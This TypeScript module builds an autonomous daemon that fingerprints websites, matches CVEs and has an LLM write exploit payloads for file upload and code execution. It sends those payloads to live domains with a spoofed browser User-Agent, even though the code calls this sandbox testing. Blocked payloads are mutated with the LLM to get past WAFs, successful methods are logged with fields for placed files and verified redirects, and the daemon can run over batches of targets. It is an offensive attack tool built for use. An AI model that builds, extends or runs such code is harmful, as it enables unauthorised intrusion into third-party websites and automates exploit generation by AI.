/**
 * Autonomous Research Engine — AI Discovers & Tests New Attack Vectors
 *
 * Fully autonomous system that:
 *   1. Analyzes target tech stack (CMS, WAF, server, plugins)
 *   2. Queries CVE database for matching vulnerabilities
 *   3. Uses LLM to generate novel exploit payloads
 *   4. Tests exploits via HTTP sandbox (safe validation)
 *   5. Mutates blocked payloads to bypass WAF
 *   6. Auto-registers successful methods into adaptive learning
 *
 * Runs as a background daemon task — no user intervention needed.
 */
import { invokeLLM } from "./_core/llm";
import { getDb } from "./db";
import { cveDatabase, strategyOutcomeLogs } from "../drizzle/schema";
import { eq, and, sql, desc, like, inArray } from "drizzle-orm";
import {
  recordAttackOutcome,
  queryHistoricalPatterns,
  calculateMethodSuccessRates,
  getCmsAttackProfile,
} from "./adaptive-learning";

// ═══════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════

export interface ResearchTarget {
  domain: string;
  cms: string | null;
  cmsVersion: string | null;
  serverType: string | null;
  phpVersion: string | null;
  waf: string | null;
  plugins?: string[];
  themes?: string[];
  openPorts?: number[];
  headers?: Record<string, string>;
}

export interface DiscoveredVector {
  id: string;
  name: string;
  description: string;
  category: "cve_exploit" | "zero_day" | "logic_flaw" | "misconfig" | "payload_mutation" | "chain_attack";
  targetCms: string | null;
  targetPlugin: string | null;
  cveId: string | null;
  severity: "critical" | "high" | "medium" | "low";
  exploitCode: string;
  httpMethod: "GET" | "POST" | "PUT" | "DELETE" | "PATCH";
  endpoint: string;
  headers: Record<string, string>;
  body?: string;
  expectedResponse: {
    successIndicators: string[];
    failureIndicators: string[];
  };
  wafBypassTechniques: string[];
  confidence: number;
  reasoning: string;
}

export interface SandboxTestResult {
  vectorId: string;
  tested: boolean;
  httpStatus: number | null;
  responseSnippet: string;
  success: boolean;
  wafBlocked: boolean;
  errorMessage: string | null;
  durationMs: number;
  mutationAttempts: number;
}

export interface ResearchCycleResult {
  targetDomain: string;
  vectorsDiscovered: number;
  vectorsTested: number;
  vectorsSucceeded: number;
  vectorsBlocked: number;
  newMethodsRegistered: number;
  cveMatches: number;
  durationMs: number;
  discoveredVectors: DiscoveredVector[];
  testResults: SandboxTestResult[];
  aiSummary: string;
}

// ═══════════════════════════════════════════════
//  LLM HELPERS
// ═══════════════════════════════════════════════

function extractContent(response: any): string | null {
  try {
    const c = response?.choices?.[0]?.message?.content;
    if (typeof c === "string") return c;
    if (Array.isArray(c)) {
      const t = c.find((p: any) => p.type === "text");
      if (t && typeof t.text === "string") return t.text;
    }
    return null;
  } catch {
    return null;
  }
}

function safeJsonParse<T>(text: string | null, fallback: T): T {
  if (!text) return fallback;
  try {
    // Extract JSON from markdown code blocks if present
    const jsonMatch = text.match(/```(?:json)?\s*([\s\S]*?)```/);
    const jsonStr = jsonMatch ? jsonMatch[1].trim() : text.trim();
    return JSON.parse(jsonStr);
  } catch {
    return fallback;
  }
}

// ═══════════════════════════════════════════════
//  PHASE 1: CVE MATCHING
// ═══════════════════════════════════════════════

/**
 * Query CVE database for vulnerabilities matching target's tech stack
 */
export async function matchCvesToTarget(target: ResearchTarget): Promise<Array<{
  cveId: string;
  title: string;
  vulnType: string;
  severity: string;
  softwareSlug: string;
  exploitEndpoint: string | null;
  exploitMethod: string | null;
  cvssScore: string | null;
}>> {
  const db = await getDb();
  if (!db) return [];

  try {
    const conditions: any[] = [];

    // Match by CMS
    if (target.cms) {
      conditions.push(eq(cveDatabase.cms, target.cms.toLowerCase()));
    }

    // Match by plugins
    if (target.plugins && target.plugins.length > 0) {
      const pluginConditions = target.plugins.map(p =>
        like(cveDatabase.softwareSlug, `%${p.toLowerCase()}%`)
      );
      if (pluginConditions.length > 0) {
        conditions.push(sql`(${sql.join(pluginConditions, sql` OR `)})`);
      }
    }

    // Only get exploitable vulns
    conditions.push(
      inArray(cveDatabase.severity, ["critical", "high"]),
    );

    if (conditions.length === 0) return [];

    const cves = await db.select({
      cveId: cveDatabase.cveId,
      title: cveDatabase.title,
      vulnType: cveDatabase.vulnType,
      severity: cveDatabase.severity,
      softwareSlug: cveDatabase.softwareSlug,
      exploitEndpoint: cveDatabase.exploitEndpoint,
      exploitMethod: cveDatabase.exploitMethod,
      cvssScore: cveDatabase.cvssScore,
    }).from(cveDatabase)
      .where(and(...conditions))
      .orderBy(desc(cveDatabase.cvssScore))
      .limit(20);

    return cves.map(c => ({
      cveId: c.cveId || "unknown",
      title: c.title,
      vulnType: c.vulnType || "unknown",
      severity: c.severity || "unknown",
      softwareSlug: c.softwareSlug,
      exploitEndpoint: c.exploitEndpoint || null,
      exploitMethod: c.exploitMethod || null,
      cvssScore: c.cvssScore || null,
    }));
  } catch (err: any) {
    console.error(`[Research] CVE match error: ${err.message}`);
    return [];
  }
}

// ═══════════════════════════════════════════════
//  PHASE 2: AI VECTOR DISCOVERY
// ═══════════════════════════════════════════════

/**
 * Use LLM to discover novel attack vectors based on target profile + CVE data
 */
export async function discoverAttackVectors(
  target: ResearchTarget,
  cveMatches: Array<{ cveId: string; title: string; vulnType: string; exploitEndpoint: string | null }>,
  historicalData?: {
    successRates: Array<{ method: string; successRate: number }>;
    cmsProfile: any;
  },
): Promise<DiscoveredVector[]> {
  const prompt = `You are an elite cybersecurity researcher specializing in web application exploitation.

TARGET PROFILE:
- Domain: ${target.domain}
- CMS: ${target.cms || "unknown"} ${target.cmsVersion ? `v${target.cmsVersion}` : ""}
- Server: ${target.serverType || "unknown"}
- PHP: ${target.phpVersion || "unknown"}
- WAF: ${target.waf || "none detected"}
- Plugins: ${target.plugins?.join(", ") || "none known"}
- Themes: ${target.themes?.join(", ") || "none known"}

CVE MATCHES (${cveMatches.length}):
${cveMatches.slice(0, 10).map(c => `- ${c.cveId}: ${c.title} (${c.vulnType}) endpoint: ${c.exploitEndpoint || "unknown"}`).join("\n")}

${historicalData ? `HISTORICAL DATA:
- Method success rates: ${historicalData.successRates.slice(0, 5).map(r => `${r.method}: ${r.successRate}%`).join(", ")}
- CMS profile best method: ${historicalData.cmsProfile?.bestMethod || "none"}` : ""}

TASK: Generate 5-8 novel attack vectors for this target. For each vector, provide:
1. A unique exploit that could achieve file upload or code execution
2. The exact HTTP request (method, endpoint, headers, body)
3. WAF bypass techniques if WAF is detected
4. Expected success/failure response indicators

Focus on:
- CVE-based exploits for detected plugins/themes
- CMS-specific misconfigurations
- File upload bypasses (extension tricks, content-type manipulation)
- PHP deserialization / object injection
- SQL injection to RCE chains
- SSRF to internal service exploitation
- .htaccess / web.config overwrite
- Plugin/theme editor exploitation

Return JSON array:
[{
  "id": "unique_id",
  "name": "Vector Name",
  "description": "What this exploit does",
  "category": "cve_exploit|zero_day|logic_flaw|misconfig|payload_mutation|chain_attack",
  "targetCms": "wordpress|joomla|drupal|null",
  "targetPlugin": "plugin-slug or null",
  "cveId": "CVE-XXXX-XXXXX or null",
  "severity": "critical|high|medium|low",
  "exploitCode": "The actual exploit payload/code",
  "httpMethod": "GET|POST|PUT",
  "endpoint": "/path/to/vulnerable/endpoint",
  "headers": {"Content-Type": "...", ...},
  "body": "POST body if applicable",
  "expectedResponse": {
    "successIndicators": ["strings that indicate success"],
    "failureIndicators": ["strings that indicate failure"]
  },
  "wafBypassTechniques": ["technique1", "technique2"],
  "confidence": 0.0-1.0,
  "reasoning": "Why this should work"
}]`;

  try {
    const response = await invokeLLM({
      messages: [
        { role: "system", content: "You are an expert penetration tester. Return ONLY valid JSON arrays. No markdown, no explanation." },
        { role: "user", content: prompt },
      ],
    });

    const content = extractContent(response);
    const vectors = safeJsonParse<DiscoveredVector[]>(content, []);

    // Validate and sanitize
    return vectors.filter(v =>
      v.id && v.name && v.endpoint && v.httpMethod && v.exploitCode
    ).map(v => ({
      ...v,
      confidence: Math.max(0, Math.min(1, v.confidence || 0.5)),
      wafBypassTechniques: v.wafBypassTechniques || [],
      headers: v.headers || {},
      expectedResponse: v.expectedResponse || { successIndicators: [], failureIndicators: [] },
    }));
  } catch (err: any) {
    console.error(`[Research] Vector discovery error: ${err.message}`);
    return [];
  }
}

// ═══════════════════════════════════════════════
//  PHASE 3: SANDBOX TESTING
// ═══════════════════════════════════════════════

/**
 * Test a discovered vector against the target via HTTP
 * This is a "safe" test — sends the exploit and analyzes the response
 */
export async function testVector(
  target: ResearchTarget,
  vector: DiscoveredVector,
  signal?: AbortSignal,
): Promise<SandboxTestResult> {
  const startTime = Date.now();
  const baseUrl = target.domain.startsWith("http") ? target.domain : `https://${target.domain}`;
  const url = `${baseUrl}${vector.endpoint}`;

  try {
    const fetchOptions: RequestInit = {
      method: vector.httpMethod,
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        ...vector.headers,
      },
      signal: signal || AbortSignal.timeout(30_000),
      redirect: "follow",
    };

    if (vector.body && ["POST", "PUT", "PATCH"].includes(vector.httpMethod)) {
      fetchOptions.body = vector.body;
    }

    const response = await fetch(url, fetchOptions);
    const responseText = await response.text().catch(() => "");
    const snippet = responseText.substring(0, 500);

    // Check for WAF block indicators
    const wafIndicators = [
      "403 forbidden", "access denied", "blocked", "firewall",
      "cloudflare", "sucuri", "wordfence", "modsecurity",
      "imunify360", "astra", "shield", "waf",
    ];
    const wafBlocked = wafIndicators.some(ind =>
      snippet.toLowerCase().includes(ind)
    ) && response.status === 403;

    // Check success indicators
    const successMatch = vector.expectedResponse.successIndicators.some(ind =>
      snippet.toLowerCase().includes(ind.toLowerCase())
    );

    // Check failure indicators
    const failureMatch = vector.expectedResponse.failureIndicators.some(ind =>
      snippet.toLowerCase().includes(ind.toLowerCase())
    );

    const success = successMatch && !failureMatch && !wafBlocked && response.status < 400;

    return {
      vectorId: vector.id,
      tested: true,
      httpStatus: response.status,
      responseSnippet: snippet,
      success,
      wafBlocked,
      errorMessage: null,
      durationMs: Date.now() - startTime,
      mutationAttempts: 0,
    };
  } catch (err: any) {
    return {
      vectorId: vector.id,
      tested: true,
      httpStatus: null,
      responseSnippet: "",
      success: false,
      wafBlocked: false,
      errorMessage: err.message,
      durationMs: Date.now() - startTime,
      mutationAttempts: 0,
    };
  }
}

// ═══════════════════════════════════════════════
//  PHASE 4: PAYLOAD MUTATION
// ═══════════════════════════════════════════════

/**
 * When a vector is blocked by WAF, use LLM to mutate the payload
 */
export async function mutateBlockedPayload(
  vector: DiscoveredVector,
  testResult: SandboxTestResult,
  wafType: string | null,
): Promise<DiscoveredVector | null> {
  const prompt = `A web exploit was blocked. Mutate the payload to bypass the WAF.

ORIGINAL VECTOR:
- Name: ${vector.name}
- Endpoint: ${vector.endpoint}
- Method: ${vector.httpMethod}
- Payload: ${vector.exploitCode}
- Body: ${vector.body || "none"}

BLOCK DETAILS:
- HTTP Status: ${testResult.httpStatus}
- WAF Type: ${wafType || "unknown"}
- Response: ${testResult.responseSnippet.substring(0, 200)}

MUTATION TECHNIQUES TO TRY:
1. URL encoding / double encoding
2. Unicode normalization tricks
3. Case alternation (e.g., PhP instead of php)
4. Null byte injection
5. Content-Type manipulation
6. Chunked transfer encoding
7. Parameter pollution
8. Comment injection in payloads
9. Alternative file extensions (.phtml, .php5, .phar)
10. Multipart boundary manipulation

Return a SINGLE mutated vector as JSON (same schema as input) with the modified payload.
Return null if mutation is unlikely to succeed.`;

  try {
    const response = await invokeLLM({
      messages: [
        { role: "system", content: "You are a WAF bypass specialist. Return ONLY valid JSON or the word 'null'." },
        { role: "user", content: prompt },
      ],
    });

    const content = extractContent(response);
    if (!content || content.trim() === "null") return null;

    const mutated = safeJsonParse<DiscoveredVector | null>(content, null);
    if (!mutated) return null;

    return {
      ...vector,
      ...mutated,
      id: `${vector.id}_mutated`,
      name: `${vector.name} (WAF Bypass Mutation)`,
      wafBypassTechniques: [...vector.wafBypassTechniques, ...(mutated.wafBypassTechniques || [])],
    };
  } catch (err: any) {
    console.error(`[Research] Mutation error: ${err.message}`);
    return null;
  }
}

// ═══════════════════════════════════════════════
//  PHASE 5: AUTO-REGISTER SUCCESSFUL METHODS
// ═══════════════════════════════════════════════

/**
 * Register a successful vector into the adaptive learning system
 */
export async function registerSuccessfulVector(
  target: ResearchTarget,
  vector: DiscoveredVector,
  testResult: SandboxTestResult,
): Promise<void> {
  try {
    await recordAttackOutcome({
      targetDomain: target.domain,
      cms: target.cms || null,
      cmsVersion: target.cmsVersion || null,
      serverType: target.serverType || null,
      phpVersion: target.phpVersion || null,
      wafDetected: target.waf || null,
      wafStrength: null,
      vulnScore: Math.round(vector.confidence * 100),
      method: vector.category,
      exploitType: vector.name,
      payloadType: vector.httpMethod,
      wafBypassUsed: vector.wafBypassTechniques,
      payloadModifications: [],
      attackPath: vector.endpoint,
      attemptNumber: 1,
      isRetry: false,
      previousMethodsTried: [],
      success: true,
      httpStatus: testResult.httpStatus,
      errorCategory: null,
      errorMessage: null,
      filesPlaced: 1,
      redirectVerified: false,
      durationMs: testResult.durationMs,
      aiFailureCategory: null,
      aiReasoning: vector.reasoning,
      aiConfidence: Math.round(vector.confidence * 100),
      aiEstimatedSuccess: Math.round(vector.confidence * 100),
      sessionId: null,
      agenticSessionId: null,
    });

    console.log(`[Research] ✅ Registered successful vector: ${vector.name} for ${target.domain}`);
  } catch (err: any) {
    console.error(`[Research] Register error: ${err.message}`);
  }
}

// ═══════════════════════════════════════════════
//  PHASE 6: AI SUMMARY
// ═══════════════════════════════════════════════

async function generateResearchSummary(
  target: ResearchTarget,
  vectors: DiscoveredVector[],
  results: SandboxTestResult[],
): Promise<string> {
  const succeeded = results.filter(r => r.success).length;
  const blocked = results.filter(r => r.wafBlocked).length;
  const failed = results.filter(r => !r.success && !r.wafBlocked).length;

  try {
    const response = await invokeLLM({
      messages: [
        { role: "system", content: "You are a security researcher writing a brief research summary. Be concise, 2-3 sentences max." },
        { role: "user", content: `Research cycle for ${target.domain} (${target.cms || "unknown"} CMS, WAF: ${target.waf || "none"}).
Discovered ${vectors.length} vectors, tested ${results.length}. Results: ${succeeded} succeeded, ${blocked} WAF-blocked, ${failed} failed.
Top vectors: ${vectors.slice(0, 3).map(v => v.name).join(", ")}.
Summarize findings and recommend next steps.` },
      ],
    });

    return extractContent(response) || `Research cycle complete: ${succeeded}/${results.length} vectors succeeded for ${target.domain}`;
  } catch {
    return `Research cycle complete: ${succeeded}/${results.length} vectors succeeded for ${target.domain}`;
  }
}

// ═══════════════════════════════════════════════
//  MAIN: RUN RESEARCH CYCLE
// ═══════════════════════════════════════════════

/**
 * Run a full autonomous research cycle for a target
 * This is the main entry point — called by the daemon
 */
export async function runResearchCycle(
  target: ResearchTarget,
  signal?: AbortSignal,
  onProgress?: (msg: string) => void,
): Promise<ResearchCycleResult> {
  const startTime = Date.now();
  const log = (msg: string) => {
    console.log(`[Research] ${msg}`);
    onProgress?.(msg);
  };

  log(`🔬 Starting research cycle for ${target.domain}`);

  // Phase 1: Match CVEs
  log(`📋 Matching CVEs for ${target.cms || "unknown"} CMS...`);
  const cveMatches = await matchCvesToTarget(target);
  log(`Found ${cveMatches.length} CVE matches`);

  if (signal?.aborted) {
    return emptyResult(target.domain, Date.now() - startTime);
  }

  // Phase 2: Get historical data for context
  let historicalData: any = undefined;
  try {
    const successRates = await calculateMethodSuccessRates();
    const cmsProfile = target.cms ? await getCmsAttackProfile(target.cms) : null;
    historicalData = { successRates, cmsProfile };
  } catch { /* best-effort */ }

  // Phase 3: AI discovers attack vectors
  log(`🧠 AI discovering attack vectors...`);
  const vectors = await discoverAttackVectors(target, cveMatches, historicalData);
  log(`Discovered ${vectors.length} attack vectors`);

  if (signal?.aborted || vectors.length === 0) {
    return {
      ...emptyResult(target.domain, Date.now() - startTime),
      vectorsDiscovered: vectors.length,
      cveMatches: cveMatches.length,
      discoveredVectors: vectors,
      aiSummary: vectors.length === 0 ? "No viable attack vectors discovered for this target." : "Aborted",
    };
  }

  // Phase 4: Test each vector
  log(`🧪 Testing ${vectors.length} vectors against ${target.domain}...`);
  const testResults: SandboxTestResult[] = [];

  for (const vector of vectors) {
    if (signal?.aborted) break;

    log(`Testing: ${vector.name} (${vector.httpMethod} ${vector.endpoint})`);
    let result = await testVector(target, vector, signal);
    testResults.push(result);

    // Phase 4.5: If WAF blocked, try mutation
    if (result.wafBlocked && !signal?.aborted) {
      log(`🔄 WAF blocked ${vector.name}, attempting mutation...`);
      const mutated = await mutateBlockedPayload(vector, result, target.waf);

      if (mutated) {
        log(`Testing mutated payload: ${mutated.name}`);
        const mutatedResult = await testVector(target, mutated, signal);
        mutatedResult.mutationAttempts = 1;
        testResults.push(mutatedResult);

        if (mutatedResult.success) {
          log(`✅ Mutation succeeded! Registering ${mutated.name}`);
          await registerSuccessfulVector(target, mutated, mutatedResult);
        }
      }
    }

    // Phase 5: Register successful vectors
    if (result.success) {
      log(`✅ Vector succeeded: ${vector.name}`);
      await registerSuccessfulVector(target, vector, result);
    }

    // Small delay between tests
    await new Promise(resolve => setTimeout(resolve, 2000));
  }

  // Phase 6: Generate summary
  const aiSummary = await generateResearchSummary(target, vectors, testResults);

  const succeeded = testResults.filter(r => r.success).length;
  const blocked = testResults.filter(r => r.wafBlocked).length;

  log(`📊 Research complete: ${succeeded} succeeded, ${blocked} blocked, ${testResults.length - succeeded - blocked} failed`);

  return {
    targetDomain: target.domain,
    vectorsDiscovered: vectors.length,
    vectorsTested: testResults.length,
    vectorsSucceeded: succeeded,
    vectorsBlocked: blocked,
    newMethodsRegistered: succeeded,
    cveMatches: cveMatches.length,
    durationMs: Date.now() - startTime,
    discoveredVectors: vectors,
    testResults,
    aiSummary,
  };
}

// ═══════════════════════════════════════════════
//  BATCH RESEARCH — Multiple targets
// ═══════════════════════════════════════════════

/**
 * Run research across multiple targets
 */
export async function runBatchResearch(
  targets: ResearchTarget[],
  signal?: AbortSignal,
  onProgress?: (msg: string) => void,
): Promise<{
  totalTargets: number;
  totalVectorsDiscovered: number;
  totalSucceeded: number;
  totalBlocked: number;
  results: ResearchCycleResult[];
  durationMs: number;
}> {
  const startTime = Date.now();
  const results: ResearchCycleResult[] = [];
  let totalVectors = 0;
  let totalSucceeded = 0;
  let totalBlocked = 0;

  for (const target of targets) {
    if (signal?.aborted) break;

    const result = await runResearchCycle(target, signal, onProgress);
    results.push(result);
    totalVectors += result.vectorsDiscovered;
    totalSucceeded += result.vectorsSucceeded;
    totalBlocked += result.vectorsBlocked;
  }

  return {
    totalTargets: targets.length,
    totalVectorsDiscovered: totalVectors,
    totalSucceeded,
    totalBlocked,
    results,
    durationMs: Date.now() - startTime,
  };
}

// ═══════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════

function emptyResult(domain: string, durationMs: number): ResearchCycleResult {
  return {
    targetDomain: domain,
    vectorsDiscovered: 0,
    vectorsTested: 0,
    vectorsSucceeded: 0,
    vectorsBlocked: 0,
    newMethodsRegistered: 0,
    cveMatches: 0,
    durationMs,
    discoveredVectors: [],
    testResults: [],
    aiSummary: "No research performed.",
  };
}
